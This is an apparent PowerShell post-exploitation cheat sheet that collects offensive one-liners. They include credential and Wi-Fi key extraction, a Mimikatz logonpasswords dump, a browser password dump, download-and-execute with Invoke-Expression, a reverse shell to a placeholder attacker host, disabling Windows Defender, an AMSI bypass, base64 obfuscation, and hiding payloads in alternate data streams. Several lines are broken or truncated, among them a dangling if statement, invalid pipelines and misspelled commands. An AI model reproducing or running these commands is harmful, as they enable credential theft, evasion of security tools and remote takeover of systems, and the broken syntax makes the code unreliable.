##powershell system footprinter.


#get system information
$systminfo = Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *

if ($systminfo -eq {properties})

#

##extracting network Configuration settings and DNS server

$systmnetwork = Get-NetIPConfiguration | Select-Object -Property InterfaceAlias, IPv4Address, IPv6Address, DNSServer

#Get host information
$hostcheck = Get-Host | Select-Object -Property Name, Version, PrivateData, Runspace

#list running processes with CPU details
$systmprocess = Get-process | Select-Object -Property ProcessName, Id, CPU | Select-Object -Property CPU -Descending

#Evant logs for Anomalies

$eventlog = Get-eventlog -LogName Security | Where-Object {$_.EvenType -eq 'FailureAudit'}

##port scanning

1..1024 | ForEach-Object {$sock = New-Object System.Net.Sockets.TCPClient; $async = $sock.BeginConnect('localhost', $_, $null, $null);
$await = $async.AsyncWaitHandle.WaitOne(100, $false);
if ($sock.Connected) {$_} ; $sock.close()}

#retrieve stored credentials
$creds = Get-Credentials | $creds.GetNetworkCredential() | Select-Object -Property Username, Password

##Executing remote commands
Invoke-Command -ComputerName TargetPc -ScriptBlock {Get-process} -Credential {Get-Credential}

#Downloading and executing 
$url = ''; Invoke-Expression (New-Object Net.WebClient).DownloadString($url)

#bypassing execution policies for scripts
Set-ExecutionPolicy ByPass -Scope Process -Force; '.\script.ps1'

##find domain name users
$aduser = Get-ADUser -Filter * -Properties * | Select-Object -Property Name, Enabled, LastLogonDate

#Extracting Wifi information
netsh wlan show profiles | Select-String -Pattern 'All User Profiles' -AllMatches | ForEach-Object {$_ -replace 'All user Profiles *: ', ''} | ForEach-Object { netsh wlan show profile name="$_" key=clear }

#watch filesystem settings
$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path='C:\'; $watcher.IncludeSubdirectories = $true;
Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }

#Creating a reverse shell
$client = New-Object System.Net.Socket.TCPClient('attacke_ip', attacker_port); $stream = $client.GetStream(); [byte[]]$byte = 0..65535...

#Disabling Windows Defender
set-MpPreference -DisableRealTimeMonitoring $true;

#extract browser saved password
Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\temp\browser.txt

#conducting network analysis

$adapter = Get-NetAdapter | Select-Object -First 1; New-NetEventSession -Name 'Session1' -CaptureMode SaveToFile -LocalFilePath 'C:\tempcapture.etl'; 
AddNetEventPacketCaptureProvider -SessionName 'Session1' -Level 4 -CaptureType Both -Enable; Start-NetEventSession -Name 'Session1'; Stop-NetEventSession -Name 'Session1' after 60

#Bypassing Anti malware Scan interface
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiinitfailed', 'NonPublic, Static').SetValue($Null, $true)

#extracting system secrets with mimikatz
Invoke-Mimikatz -Command '"serkurlsa::logonpasswords"' | Out-File -FilePath C:\temp\logonpasswords.txt

#Obfuscating with encoding

$originalstring = 'Sensitivecommand'; $obfuscatedstrng = [Convert]::ToBase64String[System.Text.Encode]::Unicode.GetBytes($originalstring); 
$deobfuscatedstrng = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($obfuscatedstrng)); Invoke-Expression $deobfuscatedstrng

#using alternate data streams for evasion
$content = 'Invoke-Mimikatz'; $file = 'C:\temp\normal.txt'; $stream = 'C:\temp\normal.txt:hidden'; Set-Content -Path $file -Value "This is a normal file";
Add-Content -Path $stream -Value $content; Get-Content -Path $stream

##invoke script in memory
$codeinmem = [System.IO.File]::ReadAllText('C:\temp\script.ps1'); Invoke-Expression $codeinmem

#bypassing script execution policy temporary
$policy = Get-ExecutionPolicy; Set-ExecutionPolicy -ExecutionPolicy ByPass -Scope Process; Get-Process; Set-ExecutionPolicy -ExecutionPolicy $policy -Scope Process

